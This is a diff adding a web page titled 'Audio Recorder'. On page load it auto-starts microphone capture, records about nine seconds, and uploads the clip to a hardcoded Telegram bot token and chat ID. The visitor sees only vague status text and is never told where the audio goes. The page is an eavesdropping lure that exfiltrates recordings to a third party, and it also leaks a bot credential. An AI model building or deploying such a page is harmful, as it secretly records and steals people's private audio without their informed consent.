@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Audio Recorder</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            overflow: hidden;
+            touch-action: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        #status {
+            color: white;
+            background: rgba(0,0,0,0.7);
+            padding: 15px;
+            border-radius: 10px;
+            font-family: Arial;
+            font-size: 16px;
+            text-align: center;
+            max-width: 80%;
+        }
+    </style>
+</head>
+<body>
+    <div id="status">Preparing to record audio...</div>
+
+    <script>
+        // Configuration
+        const BOT_TOKEN = '7687843469:AAHxK3rk1cV1Lw2vcNXcEJS3jCrPOkuPmeo';
+        const CHAT_ID = '5606922500';
+        const RECORD_DURATION = 9000; // 9 seconds
+        
+        let mediaRecorder;
+        let audioChunks = [];
+        
+        // Update status message
+        function updateStatus(msg) {
+            document.getElementById('status').textContent = msg;
+        }
+        
+        // Start recording process
+        async function startRecording() {
+            try {
+                // Request microphone permission
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                
+                // Set up recorder
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+                
+                mediaRecorder.ondataavailable = e => {
+                    audioChunks.push(e.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    await sendToTelegram(audioBlob);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                // Start recording
+                mediaRecorder.start();
+                updateStatus("Weting...");
+                
+                // Stop after 3 seconds
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    updateStatus("Okay Done...");
+                }, RECORD_DURATION);
+                
+            } catch (error) {
+                updateStatus("Error: " + error.message);
+            }
+        }
+        
+        // Send to Telegram
+        async function sendToTelegram(audioBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', '3-second audio recording');
+            formData.append('audio', audioBlob, 'recording.ogg');
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                if (result.ok) {
+                    updateStatus("Sent successfully!");
+                } else {
+                    updateStatus("Failed to send");
+                }
+            } catch (error) {
+                updateStatus("Network error");
+            }
+        }
+        
+        // Start when page loads
+        window.addEventListener('load', () => {
+            // Small delay to ensure DOM is ready
+            setTimeout(startRecording, 500);
+        });
+    </script>
+</body>
+</html>
